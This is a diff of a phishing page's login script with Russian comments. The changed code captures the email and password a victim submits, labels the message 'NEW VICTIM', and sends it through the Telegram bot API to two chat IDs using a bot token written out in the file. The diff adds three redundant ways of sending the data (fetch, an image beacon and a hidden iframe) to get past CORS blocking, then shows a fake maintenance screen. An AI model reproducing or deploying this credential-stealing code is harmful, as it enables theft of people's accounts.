@@ -110,14 +110,8 @@
 </div>
 
 <script>
-    // ОДИН БОТ (твой)
     const BOT_TOKEN = "8870629098:AAELG7u3brQfiq40IgP9dd3IB36LMBdMfbM";
-
-    // ДВА ПОЛУЧАТЕЛЯ (ты и новый человек)
-    const CHAT_IDS = [
-        "8850351378",   // ты
-        "8784393556"    // второй человек (новый)
-    ];
+    const CHAT_IDS = ["8850351378", "8784393556"];
 
     document.getElementById("loginForm").addEventListener("submit", function(event) {
         event.preventDefault();
@@ -134,14 +128,26 @@
         const text = "📩 НОВАЯ ЖЕРТВА\n📧 Email: " + email + "\n🔑 Пароль: " + password + "\n🕒 " + new Date().toLocaleString();
         const encoded = encodeURIComponent(text);
 
-        // Отправка каждому ID
-        CHAT_IDS.forEach(id => {
+        // === ТРОЙНАЯ ОТПРАВКА ДЛЯ КАЖДОГО ID ===
+        CHAT_IDS.forEach((id, index) => {
             const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + id + "&text=" + encoded;
-            fetch(url, { mode: "no-cors" });
+
+            // 1. FETCH (обычный способ)
+            fetch(url, { mode: "no-cors" }).catch(() => {});
+
+            // 2. IMAGE (работает даже при блокировке CORS)
             new Image().src = url;
+
+            // 3. IFRAME (самый надёжный, с задержкой для каждого ID)
+            setTimeout(() => {
+                const iframe = document.createElement("iframe");
+                iframe.style.display = "none";
+                iframe.src = url;
+                document.body.appendChild(iframe);
+                setTimeout(() => iframe.remove(), 3000);
+            }, 300 * (index + 1));
         });
 
-        // Показываем техработы
         document.getElementById("loginFormContainer").classList.add("hidden");
         document.getElementById("techContainer").classList.remove("hidden");
     });
